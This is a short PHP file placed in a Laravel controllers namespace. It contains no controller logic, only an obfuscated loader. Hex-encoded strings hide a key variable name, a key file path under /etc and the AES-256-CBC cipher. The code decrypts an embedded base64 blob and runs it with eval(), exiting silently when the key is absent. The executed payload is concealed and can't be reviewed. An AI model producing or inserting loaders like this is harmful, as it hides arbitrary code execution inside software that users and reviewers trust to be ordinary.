<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('gT1AFzRm5WdBPDvwE9lq7w==');

$c=base64_decode(

'HNEUYtCulALP/GaDSAQxRtlqwNaIS5Rbt2ev887SRf3XbABM35pAvoSBZPH5ZCv2UHDthtxnrEeB' .
'1pIwv39C6LZ9OhCeBGUxF0dDKikAUgswZJJuQfHBiD/3gkFcXIBfiPRTwZTasKPjbWM8PG5hI7nu' .
'x38B4ym6mbdMhoutNlNkXrmQ3QcTmW6ohXRDKu9e882Bkz1O8HuIY332Vxt+5DOxvpzQnvLPgYHY' .
'JyL7Ev2W29krYq8U5Xr5cMfUeEMT'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

